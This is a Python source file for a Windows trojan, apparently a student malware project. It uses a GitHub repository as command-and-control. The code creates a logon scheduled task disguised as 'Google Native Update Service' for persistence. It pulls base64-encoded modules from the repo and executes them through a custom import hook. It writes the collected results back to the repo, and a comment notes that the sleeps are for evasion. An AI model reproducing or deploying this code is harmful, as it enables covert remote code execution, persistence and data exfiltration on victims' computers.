import base64
import github3
import importlib
import json
import random
import sys
import threading
import time

from datetime import datetime

import win32com.client
import os
import ctypes, os

def isAdmin():
    try:
        is_admin = (os.getuid() == 0)
    except AttributeError:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    return is_admin

if isAdmin():
    pass
else:
    print("[*] - I do not have administrator priveleges...")


actionFileName = "git_trojan.exe"


if getattr(sys, 'frozen', False):
    actionDirectoryPath = os.path.dirname(sys.executable)
elif __file__:
    actionDirectoryPath = os.path.dirname(__file__)

actionFilePath = os.path.join(actionDirectoryPath, actionFileName)
print(actionDirectoryPath)
print(actionFilePath)

computer_name = "" #leave all blank for current computer, current user
computer_username = ""
computer_userdomain = ""
computer_password = ""
action_id = "Google Native Update Service(Authorized)" #arbitrary action ID
# action_path = r"C:\\dev-folder\\python-folder\\ens491-malware-github-c2\\dirlister-runkey-reddit\\reddit_api_cnc.exe" #executable path (could be python.exe)
action_path = actionFilePath
action_arguments = r'' #arguments (could be something.py)
# action_workdir = r"C:\\dev-folder\\python-folder\\ens491-malware-github-c2\\dirlister-runkey-reddit" #working directory for action executable
action_workdir = actionDirectoryPath

author = "Someone" #so that end users know who you are
description = "Run safe task when user logs in"
task_id = "GoogleNatUpdate"
task_hidden = False #set this to True to hide the task in the interface
username = ""
password = ""

#define constants
TASK_TRIGGER_LOGON = 9
TASK_CREATE_OR_UPDATE = 6
TASK_ACTION_EXEC = 0
TASK_LOGON_INTERACTIVE_TOKEN = 3

#connect to the scheduler (Vista/Server 2008 and above only)
scheduler = win32com.client.Dispatch("Schedule.Service")
scheduler.Connect(computer_name or None, computer_username or None, computer_userdomain or None, computer_password or None)
rootFolder = scheduler.GetFolder("\\")

#(re)define the task
taskDef = scheduler.NewTask(0)
colTriggers = taskDef.Triggers

trigger = colTriggers.Create(TASK_TRIGGER_LOGON)
trigger.Id = "LogonTriggerId"
trigger.UserId = os.environ.get('USERNAME') # current user account
#trigger.Enabled = False

colActions = taskDef.Actions
action = colActions.Create(TASK_ACTION_EXEC)
action.ID = action_id
action.Path = action_path
action.WorkingDirectory = action_workdir
action.Arguments = action_arguments

info = taskDef.RegistrationInfo
info.Author = author
info.Description = description

settings = taskDef.Settings
#settings.Enabled = False
settings.Hidden = task_hidden
#settings.StartWhenAvailable = True

#register the task (create or update, just keep the task name the same)
result = rootFolder.RegisterTaskDefinition(task_id, taskDef, TASK_CREATE_OR_UPDATE, "", "", TASK_LOGON_INTERACTIVE_TOKEN)

def github_connect(): # to connect to the account and priv repo
    with open('token.txt') as f:
        token = f.read()
    user = "gegestalt"
    sess = github3.login(token=token) 
    return sess.repository(user, 'sample-trojan')

def get_file_contents(dirname, module_name, repo):
    return repo.file_contents(f'{dirname}/{module_name}').content

class GitImporter():
    def __init__(self):
        self.current_module_code = ""
    
    def find_module(self, name, path=None):
        print('[*] Attemting to retrieve %s' % name)
        self.repo = github_connect()

        new_library = get_file_contents('modules', f'{name}.py', self.repo)
        if new_library is not None:
            self.current_module_code = base64.b64decode(new_library) # githubdan base64 olarak geliyor
            return self

    def load_module(self, name):
        spec = importlib.util.spec_from_loader(name, loader=None,origin=self.repo.git_url)

        new_module = importlib.util.module_from_spec(spec)
        exec(self.current_module_code,new_module.__dict__)
        sys.modules[spec.name] = new_module
        return new_module

class Trojan:
    def __init__(self, id):
        self.id = id # birden fazla kullanılcagı zaman automate edilebilir
        self.config_file = f'{id}.json'
        self.data_path = f'data/{id}/'
        self.repo = github_connect()

    def get_config(self):
        config_json = get_file_contents('config', self.config_file, self.repo)
        config = json.loads(base64.b64decode(config_json)) # githubdan base64 olarak geliyor

        for task in config:
            if task['module'] not in sys.modules:
                exec("import %s" % task['module']) 
        return config

    def module_runner(self,module):
        result = sys.modules[module].run()
        self.store_module_result(result)

    def store_module_result(self,data):
        msg = datetime.now().isoformat()
        remote_path = f'data/{self.id}/{msg}.data'
        bindata = bytes('%r' % data, 'utf-8')
        self.repo.create_file(remote_path,msg,base64.b64encode(bindata)) # githuba atarken encode

    def run(self):
        while True:
            config = self.get_config()
            for task in config:
                thread = threading.Thread(target=self.module_runner,args= (task['module'],))
                thread.start()
                time.sleep(random.randint(1, 10))

            #time.sleep(random.randint(100, 1000)) # sleeps are for evasion

if __name__ == '__main__':
    sys.meta_path.append(GitImporter())
    trojan = Trojan('abc')
    trojan.run()

